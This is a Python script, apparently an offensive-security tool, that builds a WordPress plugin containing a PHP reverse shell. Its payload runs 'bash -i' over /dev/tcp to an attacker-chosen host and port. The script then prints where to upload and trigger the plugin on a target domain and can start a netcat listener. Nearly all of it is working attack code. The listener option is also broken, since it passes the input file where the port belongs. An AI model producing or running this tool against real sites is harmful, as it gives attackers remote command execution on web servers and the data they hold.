#!/usr/bin/env python3

### reversePress.py                               ###
### A WordPress reverse shell plugin generator  ###
### github.com/MachadoOtto                      ###

# Imports
import argparse
import os
import sys
import zipfile

# Color Constants
BLUE = '\33[34m'
GREEN = '\33[32m'
RED = '\33[31m'
NOCOLOR = '\33[0m'

# Default Plugin Information
PLUGIN_INFO = '''<?php
/**
 * Plugin Name: ReversePress
 * Version: 1.0.0
 * Author: MachadoOtto
 * Author URI: https://github.com/MachadoOtto
 * License: MIT
 */
?>\n'''

# Default PHP reverse shell payload
PAYLOAD = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") ?>'

# Visual Functions
def printScreen():
    t = """┌───────────────────────────────────────────────►
│{1}###{0}   {2}reversePress.py{0}                         {1}###{0}│
│{1}###{0}   {3}A WordPress plugin generator...{0}       {1}###{0}│
│{1}###{0}   {3}        ... with a reverse shell!!!{0}   {1}###{0}│
│{1}###{0}   github.com/MachadoOtto                {1}###{0}│
◄───────────────────────────────────────────────┘"""
    print(t.format(NOCOLOR, BLUE, GREEN, RED))

# Print info
def printInfo(host, port, input_file, listener):
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Selected host: ' + host)
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Selected port: ' + port)
    input_file_name = os.path.basename(input_file) if input_file else None
    if input_file:
        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Selected input file: ' + input_file_name)
    else:
        print('[' + BLUE + 'INFO' + NOCOLOR + ']: No input file selected. Using default PHP reverse shell.')
    if listener:
        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Listener will be started after generating the plugin.')

# Generate plugin
def generatePlugin(host, port, input_file, output_file):
    input_file_name = os.path.basename(input_file) if input_file else None
    # Generate Plugin Information Script
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Generating plugin information...')
    try:
        with open('plugin_info.php', 'w') as f:
            f.write(PLUGIN_INFO)
    except Exception as e:
        print('[' + RED + 'ERROR' + NOCOLOR + ']: An error has occurred while generating the plugin information: ' + str(e))
        sys.exit()
    # Generate Reverse Shell Script
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Generating reverse shell script...')
    reverse_shell = PAYLOAD.replace('LHOST', host).replace('LPORT', port)
    if not input_file:
        try:
            with open('reverse_shell.php', 'w') as f:
                f.write(reverse_shell)
        except Exception as e:
            print('[' + RED + 'ERROR' + NOCOLOR + ']: An error has occurred while generating the reverse shell script: ' + str(e))
            sys.exit()
    # Generate .ZIP Plugin File
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Generating .ZIP plugin file...')
    if not output_file:
        output_file = 'reverse_shell_plugin.zip'
    try:
        with zipfile.ZipFile(output_file, 'w') as f:
            f.write('plugin_info.php')
            if input_file:
                f.write(input_file)
            else:
                f.write('reverse_shell.php')
    except Exception as e:
        print('[' + RED + 'ERROR' + NOCOLOR + ']: An error has occurred while generating the .ZIP plugin file: ' + str(e))
        sys.exit()
    # Delete Temporary Files
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Cleaning up temporary files...')
    try:
        os.remove('plugin_info.php')
        if not input_file:
            os.remove('reverse_shell.php')
    except Exception as e:
        print('[' + RED + 'ERROR' + NOCOLOR + ']: An error has occurred while deleting temporary files: ' + str(e))
        sys.exit()
    # Print Success Message
    print('[' + GREEN + 'SUCCESS' + NOCOLOR + ']: Plugin generated successfully!')
    print('[' + GREEN + 'INFO' + NOCOLOR + ']: Plugin saved as ' + output_file + '\n')
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Upload the plugin at http://<target_domain>/wp-admin/plugin-install.php?tab=upload')
    if input_file_name:
        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ReversePress/' + input_file_name)
    else:
        print('[' + BLUE + 'INFO' + NOCOLOR + ']: Trigger the reverse shell at http://<target_domain>/wp-content/plugins/ReversePress/reverse_shell.php')

# Start Netcat Listener
def startListener(port):
    print('[' + BLUE + 'INFO' + NOCOLOR + ']: Starting netcat listener on port ' + port)
    os.system('nc -nlvp ' + port)

# Main function
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--input', help = 'custom PHP reverse shell file to add to the plugin', type = str)
    parser.add_argument('-l', '--listener', action = 'store_true', help = 'start a netcat listener after generating the plugin')
    parser.add_argument('-o', '--output', help = 'name of the file to be generated', default = 'reverse_shell_plugin.zip')
    parser.add_argument('-p', '--port', help = 'port to listen on', default = '25250')
    parser.add_argument('host', help = 'host to connect back to', type = str)
    args = parser.parse_args()
    try:
        printScreen()
        printInfo(args.host, args.port, args.input, args.listener)
        generatePlugin(args.host, args.port, args.input, args.output)
        if args.listener:
            startListener(args.input)
    except KeyboardInterrupt:
        print('[' + RED + 'EXIT' + NOCOLOR + ']: Keyboard interrupt detected. Exiting... ')
        sys.exit()
    except Exception as e:
        print('[' + RED + 'ERROR' + NOCOLOR + ']: An unexpected error has occurred: ' + str(e))
        sys.exit()

if __name__ == '__main__':
    main()